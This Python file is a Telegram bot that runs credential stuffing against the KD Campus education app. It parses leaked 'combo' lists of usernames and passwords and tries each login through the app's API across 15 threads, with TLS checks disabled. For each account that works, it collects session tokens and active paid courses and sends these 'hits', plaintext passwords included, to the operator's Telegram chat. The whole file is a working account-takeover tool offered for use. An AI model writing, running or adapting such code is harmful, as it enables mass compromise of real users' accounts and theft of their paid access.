import re
import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor
from functools import partial
import os
import threading
import time

# --- CONFIG ---
MAX_THREADS = 15
print_lock = threading.Lock()
progress_lock = threading.Lock()

# KD Campus API URLs
BASE_URL = "https://web.kdcampus.live"
LOGIN_URL = f"{BASE_URL}/android/Usersn/login_user"
COURSES_URL = f"{BASE_URL}/android/Dashboard/get_mycourse_data_renew_new"
IMAGE_BASE = "http://kdcampus.live/uploaded/landing_images/"
API_KEY = "kdc123"

HEADERS = {
    "User-Agent": "okhttp/4.10.0",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
    "Accept": "application/json",
}

# --- HELPERS ---
def get_kd_thumb_url(image_name):
    if not image_name:
        return ""
    if str(image_name).strip().startswith("http"):
        return str(image_name).strip()
    return IMAGE_BASE + str(image_name).strip()

def kd_login(phone, password):
    """Login using sha512 hash"""
    try:
        password_hash = hashlib.sha512(password.encode()).hexdigest()
        payload = {
            "code": "", "valid_id": "", "api_key": API_KEY,
            "mobilenumber": phone, "password": password_hash
        }
        session = requests.Session()
        session.headers.update(HEADERS)
        
        resp = session.post(LOGIN_URL, json=payload, timeout=20, verify=False)
        if not resp.text.strip():
            return False, None, None, None, None
        
        resp_json = resp.json()
        msg = resp_json.get("message", "").lower()
        data = resp_json.get("data", {})
        
        is_success = ("login successful" in msg) or (str(resp_json.get("response")) == "1")
        
        if is_success and data:
            userid = data.get("id")
            token = data.get("connection_key")
            name = data.get("name", "User")
            if userid and token:
                return True, str(userid), str(token), str(name), session
        
        # Two-step login (OTP)
        valid_id = resp_json.get("valid_id")
        if valid_id:
            payload["valid_id"] = valid_id
            resp2 = session.post(LOGIN_URL, json=payload, timeout=20, verify=False)
            resp2_json = resp2.json()
            data2 = resp2_json.get("data", {})
            is_success2 = ("login successful" in resp2_json.get("message", "").lower()) or (str(resp2_json.get("response")) == "1")
            
            if is_success2 and data2:
                userid = data2.get("id")
                token = data2.get("connection_key")
                name = data2.get("name", "User")
                if userid and token:
                    return True, str(userid), str(token), str(name), session
        
        return False, None, None, None, None
    except:
        return False, None, None, None, None

def get_kd_courses(session, userid, token):
    """Fetch all courses/batches"""
    try:
        url = f"{COURSES_URL}/{token}/{userid}/4"
        resp = session.get(url, headers=HEADERS, timeout=25, verify=False)
        if not resp.text.strip():
            return []
        
        resp_json = resp.json()
        if not isinstance(resp_json, list):
            return []
        
        courses = []
        for item in resp_json:
            days_remaining = item.get("days_remaining") or item.get("remaining_days") or 0
            try:
                days_remaining = int(days_remaining)
            except:
                days_remaining = 0
            
            # Sirf active batches (jo expire nahi hue)
            if days_remaining > 0:
                course = {
                    "batch_id": str(item.get("batch_id", "")),
                    "batch_name": item.get("batch_name", "Unknown Batch"),
                    "image": item.get("banner_image_name") or item.get("course_image") or "",
                    "days_remaining": days_remaining,
                    "price": item.get("price") or item.get("selling_price") or "N/A",
                }
                courses.append(course)
        
        return courses
    except:
        return []

def parse_combo(line):
    line = line.strip()
    if not line:
        return None
    
    try:
        parts = line.split("*") if "*" in line else line.split(":")
        if len(parts) < 2:
            return None
        password = parts[-1].strip()
        username = parts[-2].strip()
        if " " in username:
            username = username.split(" ")[-1]
        username = re.sub(r'[^0-9a-zA-Z]', '', username)
        if username.isdigit():
            username = username[-10:]
        
        if not username or not password:
            return None
        return username, password
    except:
        return None

# --- BOT LOGIC ---
def check_account(line, bot, chat_id, hits_list, state, total_lines):
    parsed = parse_combo(line)
    if not parsed:
        with print_lock:
            state['checked'] += 1
        return

    username, password = parsed
    
    try:
        # Step 1: Login
        success, userid, token, name, session = kd_login(username, password)
        
        if not success:
            with print_lock:
                state['checked'] += 1
            return

        # Step 2: Fetch Courses
        courses = get_kd_courses(session, userid, token)
        
        # Step 3: Result Handling
        with print_lock:
            if courses:
                state['hits'] += 1
                state['checked'] += 1
                
                # DETAILED FORMAT
                hit_text = "🎓 *App : KD Campus*\n"
                hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                hit_text += f"🔑 *COMBO:* `{username}:{password}`\n"
                hit_text += f"👤 *NAME:* {name}\n"
                hit_text += f"🆔 *USERID:* `{userid}`\n"
                hit_text += f"🎫 *TOKEN:* `{token}`\n"
                hit_text += f"📊 *ACTIVE BATCHES:* {len(courses)}\n"
                hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                
                for idx, course in enumerate(courses, 1):
                    batch_name = course['batch_name']
                    batch_id = course['batch_id']
                    days = course['days_remaining']
                    price = course['price']
                    thumb = get_kd_thumb_url(course['image'])
                    
                    hit_text += f"\n{idx}. *{batch_name}*\n"
                    hit_text += f"   🪪 *Batch ID:* `{batch_id}`\n"
                    hit_text += f"   💰 *Price:* ₹{price}\n"
                    hit_text += f"   ⏳ *Left:* {days} days\n"
                    if thumb:
                        hit_text += f"   🖼️ *Thumbnail:* [View]({thumb})\n"
                
                hit_text += "━━━━━━━━━━━━━━━━━━━━\n"
                
                hits_list.append(hit_text)
                
                # Update progress (5 second rule)
                update_progress(bot, chat_id, state['msg_id'], state['hits'], state['checked'], total_lines, state)
            else:
                state['checked'] += 1

    except Exception as e:
        with print_lock:
            state['checked'] += 1

def update_progress(bot, chat_id, msg_id, hits, checked, total, state):
    """Update progress only every 5 seconds"""
    current_time = time.time()
    
    # Check if 5 seconds have passed since last update
    if current_time - state.get('last_update', 0) >= 5:
        with progress_lock:
            # Double check inside lock
            if current_time - state.get('last_update', 0) >= 5:
                try:
                    if total > 0:
                        progress_percent = int((checked / total) * 10)
                        bar = "■" * progress_percent + "▢" * (10 - progress_percent)
                    else:
                        bar = "■■▢▢▢▢▢▢"
                    
                    progress_text = f"""╭───☀ 𝖢𝖧𝖤𝖢𝖪𝖨𝖭𝖦 ☀───╮
┣ ⚙️ {bar} 
┣ 📊 Hit : {hits}
┣ 📂 Loaded : {checked}/{total}
┣ 🔥 Status : Checking...
╰─── 𝐊𝐃 𝐂𝐚𝐦𝐩𝐮𝐬 𝐁𝐨𝐭 ───╯"""
                    
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=progress_text)
                    state['last_update'] = current_time
                except:
                    pass

def run_check(bot, chat_id, progress_msg_id, combo_file, platform_name):
    hits_list = []
    
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = [l.strip() for l in f.readlines() if l.strip()]

    total_lines = len(lines)
    state = {'hits': 0, 'checked': 0, 'msg_id': progress_msg_id, 'last_update': 0}
    
    func = partial(check_account, bot=bot, chat_id=chat_id, hits_list=hits_list, state=state, total_lines=total_lines)
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(func, lines)

    # Final File
    final_filename = "kdcampushit.txt"
    if hits_list and state['hits'] > 0:
        with open(final_filename, "w", encoding="utf-8") as f:
            for hit in hits_list:
                f.write(hit)

        time.sleep(2)
        try:
            with open(final_filename, "rb") as f:
                bot.send_document(chat_id, f, caption=f"✅ {platform_name} Valid Hits ({state['hits']})")
        except:
            pass
        
        if os.path.exists(final_filename):
            os.remove(final_filename)
    else:
        try:
            bot.send_message(chat_id, "❌ No valid hits found.")
        except:
            pass

    try:
        bot.delete_message(chat_id, progress_msg_id)
    except:
        pass
        
    if os.path.exists(combo_file):
        os.remove(combo_file)